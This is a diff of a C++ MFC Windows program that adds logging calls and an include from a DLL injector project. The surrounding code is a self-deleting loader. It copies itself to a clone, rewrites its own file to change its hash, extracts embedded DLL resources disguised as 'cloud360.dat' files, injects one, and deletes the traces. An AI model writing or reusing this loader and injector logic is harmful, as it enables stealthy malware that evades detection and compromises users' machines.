@@ -12,6 +12,7 @@
 #define new DEBUG_NEW
 #endif
 
+#include "ext\Xenos-master\src\Log.h"
 
 // CMFCApplication1App
 
@@ -125,7 +126,13 @@ BOOL CMFCApplication1App::InitInstance()
 
 	if (__argc == 1) {
 
+		
 		Recurse(L"");
+		
+		xlog::Normal(
+			"delete *dat* files"
+
+		);
 
 		// Original EXE: Spawn clone EXE to delete this EXE
 		// Copy this EXEcutable image into the user''s temp directory
@@ -140,7 +147,7 @@ BOOL CMFCApplication1App::InitInstance()
 		//***注意了***:
 		// Open the clone EXE using FILE_FLAG_DELETE_ON_CLOSE
 		HANDLE hfile = CreateFile(szPathClone, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
-
+		xlog::Normal(			"first time"	);
 		// Spawn the clone EXE passing it our EXE''s process handle
 		// and the full path name to the Original EXE file.
 		TCHAR szCmdLine[512];
@@ -158,7 +165,7 @@ BOOL CMFCApplication1App::InitInstance()
 		// This original process can now terminate.
 	}
 	else {
-
+		xlog::Normal("second time");
 		// Clone EXE: When original EXE terminates, delete it
 		HANDLE hProcessOrig = (HANDLE)_ttoi(__targv[1]);
 		WaitForSingleObject(hProcessOrig, INFINITE);
@@ -244,6 +251,7 @@ BOOL CMFCApplication1App::InitInstance()
 			WriteFile(hFile2, FileContent, dwDataLen, &Written, NULL);//写入文件   
 			CloseHandle(hFile2);//关闭句柄
 			DeleteFile(__targv[2]);
+			xlog::Normal("change hash");
 			// Insert code here to remove the subdirectory too (if desired).
 
 			// The system will delete the clone EXE automatically
@@ -268,17 +276,20 @@ BOOL CMFCApplication1App::InitInstance()
 		{
 			//第三次打开
 			// 释放资源DLL  
+			xlog::Normal("third time");
 			DeleteFile(__targv[2]);
 			TCHAR szPathOrig[_MAX_PATH],  szPathClone[_MAX_PATH];
 			GetTempPath(_MAX_PATH, szPathOrig);
 			wsprintf(szPathClone, __TEXT("%s/cloud360.dat"), szPathOrig);
-
+			xlog::Normal("extract dats");
 			//ReleaseResFile(IDR_RT_DLL2, _T("RT_DLL"), szPathClone);
 			ReleaseResFile(IDR_RT_DLL2, _T("RT_DLL"), _T("./cloud360.dat"));
 			ReleaseResFile(IDR_RT_DLL1, _T("RT_DLL"), _T("./cloud360.dat~"));
+			xlog::Normal("inject 360~");
 			my_wWinMain();
+			xlog::Normal("delete 360~");
 			DeleteFile(_T("./cloud360.dat~"));
-
+			xlog::Normal("quit");
 		}
 
 
